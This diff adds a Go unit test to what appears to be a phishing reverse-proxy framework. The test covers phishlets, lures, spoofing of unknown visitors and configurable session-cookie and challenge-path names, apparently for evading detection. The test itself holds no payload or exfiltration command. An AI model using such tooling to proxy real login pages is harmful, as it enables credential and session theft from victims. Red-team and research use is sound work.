@@ -59,3 +59,35 @@ func TestChallengeInterstitial(t *testing.T) {
 		t.Fatalf("unknown must spoof: %q", rec3.Body.String())
 	}
 }
+
+func TestCustomNames(t *testing.T) {
+	st := phishlet.NewStore()
+	if err := st.LoadDir("../../configs/phishlets"); err != nil {
+		t.Fatal(err)
+	}
+	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = w.Write([]byte(`<html><body>x</body></html>`))
+	}))
+	defer up.Close()
+	ls := lures.New()
+	ls.Seed("labtest", "/l/test01")
+	eng := New(st, session.NewMemory(0), nil)
+	eng.SetUpstream(map[string]string{"origin.upstream.test": up.URL})
+	eng.SetLures(ls)
+	eng.SetSidName("s3ss")
+	eng.SetChallengePrefix("/zz9")
+	req := httptest.NewRequest(http.MethodGet, "http://login.phish.test/", nil)
+	uaHuman(req)
+	rec := httptest.NewRecorder()
+	eng.ServeHTTP(rec, req)
+	found := false
+	for _, c := range rec.Result().Cookies() {
+		if c.Name == "s3ss" {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("custom sid missing: %v", rec.Result().Cookies())
+	}
+}
